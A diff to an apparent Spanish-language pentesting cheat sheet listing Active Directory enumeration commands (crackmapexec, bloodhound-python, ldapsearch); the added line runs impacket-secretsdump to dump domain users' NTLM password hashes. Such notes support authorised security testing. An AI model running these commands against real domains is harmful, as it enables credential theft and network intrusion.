@@ -653,6 +653,7 @@ ENUM
   crackmapexec smb [IP_DC] --pass-pol --> enumerar politica contraseñas del dominio
   bloodhound-python -u user -p password -d dominio.local -c All --> sacar información del dominio para verla con bloodhound
   ldapsearch -LLL -x -H ldap://dominio.local -b "" -s base "(objectclass=*)" --> descubrir el DC por medio de ldap
+  impacket-secretsdump -just-dc-ntlm dominio.local/user@IP -- mostrar hash de contraseñas de usuarios
 https://www.hackplayers.com/2022/03/top10-de-ataques-al-directorio-activo.html
 
 
